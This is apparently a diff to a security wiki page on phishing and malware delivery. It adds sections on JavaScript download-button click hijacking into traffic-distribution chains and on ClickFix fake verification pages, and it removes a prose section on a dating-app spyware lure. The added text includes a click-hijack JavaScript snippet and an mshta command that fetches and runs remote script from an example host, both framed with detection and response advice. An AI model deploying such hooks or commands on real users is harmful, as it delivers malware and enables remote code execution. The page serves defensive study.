@@ -526,6 +526,43 @@ Commodity crews offset the cost of high-touch ops with mass attacks that turn **
   ```
 * Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).
 
+### Download-button click hijacking with TDS handoff
+Some fake software portals keep the visible download `href` pointing to the **real** GitHub/release URL but hijack the **first** user interaction in JavaScript and send the victim into a **Traffic Distribution System (TDS)** chain instead.
+
+```javascript
+const cachedOpen = window.open;
+document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
+  if (!isEligibleClick(e.target)) return;
+  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
+  e.stopImmediatePropagation();
+  e.preventDefault();
+}, true);
+```
+
+Key traits:
+- The hook usually runs in the **capture phase** (`true`) on `document`, so it fires before site handlers.
+- Chrome often uses `mousedown` instead of `click` to keep the redirect tied to a valid **user gesture** and improve popup-blocker bypass.
+- Some variants pre-open `about:blank` or synthesize `<a target="_blank">` clicks and only later assign the TDS URL.
+- Browser-side caps commonly live in `localStorage`, so the **first click** may reach malware while refreshes/retries fall back to the benign-looking visible link.
+- The TDS can gate by referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, and per-session counters, making analyst replays non-deterministic.
+
+Defender ideas:
+- Compare the **displayed** `href` with the **actual** navigation target generated at click time.
+- Hunt for `document.addEventListener(..., true)` handlers that call both `preventDefault()` and `stopImmediatePropagation()` around `window.open`, `about:blank`, or synthetic anchor clicks.
+- Treat clusters of newly registered software-download domains that all load the same CloudFront/JS stage as a high-signal SEO-poisoning/TDS pattern.
+
+### ClickFix from fake verification pages + archive-looking LOLBAS fetches
+Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:
+
+```cmd
+C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
+```
+
+Notes:
+- `mshta.exe` executes the **HTA/VBScript at the start of the response**, even if the URL pretends to be a `.7z` archive; appended archive data can be pure decoy.
+- Follow-on stages often keep lying about file type (`.rtf` for PowerShell, `.asar` for Python, ZIPs with padded binaries) and then switch to **manual PE mapping / in-memory execution**.
+- If you are responding to one of these chains, preserve **network + memory from the first successful run**: later replays may only show a benign installer/SFX path or fail because the payload/key release was bound to the original TDS session.
+
 ### ClickFix DLL delivery tradecraft (fake CERT update)
 * Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
 * Typical batch chain observed:
@@ -627,11 +664,6 @@ clipboard-hijacking.md
 mobile-phishing-malicious-apps.md
 {{#endref}}
 
-### Romance-gated APK + WhatsApp pivot (dating-app lure)
-* The APK embeds static credentials and per-profile “unlock codes” (no server auth). Victims follow a fake exclusivity flow (login → locked profiles → unlock) and, on correct codes, are redirected into WhatsApp chats with attacker-controlled `+92` numbers while spyware runs silently.
-* Collection starts even before login: immediate exfil of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). A content observer auto-uploads new photos; a scheduled job re-scans for new documents every **5 minutes**.
-* Persistence: registers for `BOOT_COMPLETED` and keeps a **foreground service** alive to survive reboots and background evictions.
-
 ### WhatsApp device-linking hijack via QR social engineering
 * A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
 * Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.
@@ -678,5 +710,6 @@ Defence tips:
 - [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
 - [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
 - [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
+- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
 
 {{#include ../../banners/hacktricks-training.md}}
